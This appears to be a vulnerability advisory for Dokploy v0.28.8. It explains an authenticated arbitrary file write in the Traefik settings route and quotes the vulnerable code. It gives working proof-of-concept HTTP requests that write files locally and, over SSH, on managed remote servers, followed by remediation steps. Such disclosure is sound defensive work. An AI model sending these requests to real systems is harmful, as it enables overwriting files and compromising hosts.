repo.description: ### Summary An authenticated user with `traefikFiles:write` permission can supply an arbitrary filesystem path to `settings.updateTraefikFile`, causing Dokploy to write attacker-controlled content to that path. This enables arbitrary file overwrite in the Dokploy runtime environment and, when `serverId` is supplied, arbitrary file overwrite on a managed remote server over SSH. ### Details The vulnerable route is `settings.updateTraefikFile`: - /dokploy-0.28.8/apps/dokploy/server/api/routers/settings.ts#L556 Input validation is insufficient: - /dokploy-0.28.8/packages/server/src/db/schema/user.ts#L159 ```ts export const apiModifyTraefikConfig = z.object({ path: z.string().min(1), traefikConfig: z.string().min(1), serverId: z.string().optional(), }); ``` The write sink uses the attacker-controlled path directly: - /dokploy-0.28.8/packages/server/src/utils/traefik/application.ts#L224 ```ts export const writeTraefikConfigInPath = async ( pathFile: string, traefikConfig: string, serverId?: string, ) => { const configPath = path.join(pathFile); if (serverId) { const encoded = encodeBase64(traefikConfig); await execAsyncRemote( serverId, `echo "${encoded}" | base64 -d > "${configPath}"`, ); } else { fs.writeFileSync(configPath, traefikConfig, "utf8"); } }; ``` Two issues are present: - `path` is not restricted to the Traefik directory. - `serverId` is accepted by the write route without an organization ownership check before the remote write happens. The remote execution helper resolves the server and executes the write over SSH: - /dokploy-0.28.8/packages/server/src/utils/process/execAsync.ts#L142 - /dokploy-0.28.8/packages/server/src/services/server.ts#L37 In contrast, `readTraefikFile` does have a base-path restriction, so this is not a confirmed full arbitrary file read primitive. ### PoC Tested on Dokploy `v0.28.8`. Test account used: - `test@gmail.com / Bounty@1234` #### Variant 1: local arbitrary file write outside the Traefik directory 1. Log in and obtain a `better-auth.session_token` cookie. 2. Send: ```http POST /api/trpc/settings.updateTraefikFile?batch=1 HTTP/1.1 Host: 127.0.0.1:3000 Content-Type: application/json Cookie: better-auth.session_token= {"0":{"json":{"path":"/tmp/browser_traefik_write_probe","traefikConfig":"browser-probe-local"}}} {"0":{"json":{"path":"/etc/dokploy/browser_traefik_write_probe_outside_traefik.txt","traefikConfig":"browser-probe-local-etc"}}} ``` 3. Verify inside the Dokploy runtime container: ```bash docker exec dokploy-audit sh -lc 'ls -l /etc/dokploy/browser_traefik_write_probe_outside_traefik.txt && printf "CONTENT:" && cat /etc/dokploy/browser_traefik_write_probe_outside_traefik.txt' ``` Observed result: ```text -rw-r--r-- 1 root root 23 ... /etc/dokploy/browser_traefik_write_probe_outside_traefik.txt CONTENT:browser-probe-local-etc ``` #### Variant 2: remote arbitrary file write 1. Reuse the authenticated browser/session cookie. 2. Send: ```http POST /api/trpc/settings.updateTraefikFile?batch=1 HTTP/1.1 Host: 127.0.0.1:3000 Content-Type: application/json Cookie: better-auth.session_token= {"0":{"json":{"path":"/audit-marker/browser_traefik_remote_write_probe_non_tmp.txt","traefikConfig":"browser-probe-remote-audit-marker","serverId":"case2server"}}} ``` 3. Verify on the managed server: ```bash docker exec audit-ssh-target sh -lc 'ls -l /audit-marker/browser_traefik_remote_write_probe_non_tmp.txt && printf "CONTENT:" && cat /audit-marker/browser_traefik_remote_write_probe_non_tmp.txt' ``` Observed result: ```text -rw-r--r-- 1 root root 33 ... /audit-marker/browser_traefik_remote_write_probe_non_tmp.txt CONTENT:browser-probe-remote-audit-marker ``` Browser-based validation: - The vulnerability was also replayed from an authenticated browser session on the `Traefik File System` page. ### Impact This is an authenticated arbitrary file write vulnerability. Impacted scenarios: - Local Dokploy runtime: arbitrary file overwrite inside the Dokploy execution environment. - Managed servers: arbitrary file overwrite on remote hosts reachable through Dokploy SSH management. Potential consequences: - Overwriting configuration files - Planting attacker-controlled files for follow-on exploitation - Service disruption - Remote host compromise when the overwritten path influences privileged services or deployment flows ### Remediations - Restrict `path` to a canonicalized path under the intended Traefik base directory. - Enforce `path.resolve()` plus prefix checks instead of `path.join(pathFile)`. - Reject absolute paths and traversal attempts on the write route. - Validate that `serverId` belongs to the active organization before performing any remote write. - Prefer safe remote file transfer primitives over shell-based `echo ... > path` writes.
repo.summary: Authenticated arbitrary file write in Traefik settings allows local and remote file overwrite
